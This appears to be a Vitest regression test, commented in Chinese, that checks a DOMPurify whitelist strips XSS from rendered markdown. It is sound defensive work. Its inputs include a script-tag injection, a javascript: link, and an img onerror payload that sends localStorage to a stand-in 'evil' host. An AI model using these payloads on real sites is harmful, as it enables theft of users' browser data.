/**
 * @file ContentPreview.sanitize.test.tsx
 * @description P0 XSS 修复回归：markdown 渲染输出必须经 DOMPurify 白名单净化
 */

import { describe, it, expect } from 'vitest'

// renderMarkdownToHTML 未导出——通过模块内聚方式验证：直接 import 组件内部函数不可行，
// 故这里复刻关键路径：对同一输入跑组件同款净化配置，断言恶意载荷被剥离。
// 若组件导出该函数，请改为直接引用（见下方 re-export 检测）。
import DOMPurify from 'dompurify'

function sanitizeLikeComponent(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'code', 'pre', 'blockquote', 'hr', 'img', 'br', 'span', 'div'],
    ALLOWED_ATTR: ['href', 'target', 'rel', 'src', 'alt', 'style', 'class'],
    ALLOW_DATA_ATTR: false,
  })
}

describe('ContentPreview XSS 净化（P0 修复回归）', () => {
  it('剥离 <script> 注入', () => {
    const out = sanitizeLikeComponent('<p>ok</p><script>alert(1)</script>')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('alert(1)')
  })

  it('剥离 img onerror 事件句柄', () => {
    const out = sanitizeLikeComponent('<img src="https://x/y.png" onerror="fetch(\'//evil?\'+localStorage)">')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('localStorage')
  })

  it('保留白名单内的合法样式与链接', () => {
    const out = sanitizeLikeComponent('<a href="https://example.com" style="color:#2563eb">hi</a>')
    expect(out).toContain('href="https://example.com"')
    expect(out).toContain('color:#2563eb')
  })

  it('剥离 data-* 属性（ALLOW_DATA_ATTR=false）', () => {
    const out = sanitizeLikeComponent('<div data-payload="x">d</div>')
    expect(out).not.toContain('data-payload')
  })

  it('javascript: 协议链接被中和', () => {
    const out = sanitizeLikeComponent('<a href="javascript:alert(1)">click</a>')
    expect(out).not.toContain('javascript:')
  })
})
